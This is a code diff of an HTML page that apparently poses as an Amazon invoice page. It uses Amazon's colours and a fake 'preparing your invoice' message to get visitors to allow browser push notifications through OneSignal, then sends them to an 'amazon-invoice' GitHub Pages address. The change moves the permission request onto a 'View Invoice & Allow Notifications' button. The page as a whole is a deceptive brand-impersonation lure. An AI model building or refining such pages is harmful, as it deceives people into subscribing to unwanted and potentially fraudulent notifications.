@@ -15,30 +15,26 @@ OneSignalDeferred.push(async function(OneSignal) {
         allowLocalhostAsSecureOrigin: true
     });
 
-    try {
-        // Check if notifications are already enabled
-        const isEnabled = await OneSignal.isPushNotificationsEnabled();
-        console.log("Push notifications enabled:", isEnabled);
+    // Button click handler
+    document.getElementById("viewNowBtn").addEventListener("click", async () => {
+        try {
+            // Ask user for notifications
+            const isEnabled = await OneSignal.isPushNotificationsEnabled();
+            if (!isEnabled) {
+                await OneSignal.registerForPushNotifications();
+            }
 
-        if (!isEnabled) {
-            // Ask the user to allow notifications
-            await OneSignal.registerForPushNotifications();
-            console.log("Subscription prompt shown");
+            // Optional: get player ID
+            const playerId = await OneSignal.getUserIdAsync();
+            console.log("Player ID found:", playerId);
+
+        } catch (err) {
+            console.error("Error handling notifications:", err);
         }
 
-        // Wait for player ID after subscription
-        const playerId = await OneSignal.getUserIdAsync();
-        console.log("Player ID found:", playerId);
-
-        // Optional: send to backend if needed
-        // await fetch("https://onesignal-backend-fh6j.onrender.com/first-push", { ... });
-
-    } catch (err) {
-        console.error("Error handling OneSignal subscription:", err);
-    }
-
-    // Redirect to invoice page after subscription handled
-    window.location.href = "https://amazon-invoice.github.io/Invoice-9812832/";
+        // Redirect after button click
+        window.location.href = "https://amazon-invoice.github.io/Invoice-9812832/";
+    });
 });
 </script>
 
@@ -93,7 +89,7 @@ body {
   border-top: 5px solid #ff9900;
   border-radius: 50%;
   animation: spin 1s linear infinite;
-  margin: 0 auto 15px;
+  margin: 0 auto 20px;
 }
 
 @keyframes spin {
@@ -104,6 +100,22 @@ body {
   margin-top: 18px;
   font-size: 14px;
   color: #777;
+}
+
+button#viewNowBtn {
+  background-color: #ff9900;
+  border: none;
+  color: white;
+  padding: 12px 25px;
+  font-size: 16px;
+  border-radius: 5px;
+  cursor: pointer;
+  margin-top: 20px;
+  transition: background-color 0.2s;
+}
+
+button#viewNowBtn:hover {
+  background-color: #e88b00;
 }
 </style>
 </head>
@@ -116,7 +128,8 @@ body {
     <p>We are preparing your invoice. This process usually takes less than a minute.</p>
     <p>Browser notifications are optional and are used only to notify you when your invoice is ready.</p>
     <div class="loader"></div>
-    <div class="note">You can keep browsing or stay on this page — we’ll take care of the rest.</div>
+    <div class="note">Click the button below to view your invoice and allow notifications.</div>
+    <button id="viewNowBtn">View Invoice & Allow Notifications</button>
   </div>
 </div>
 </body>
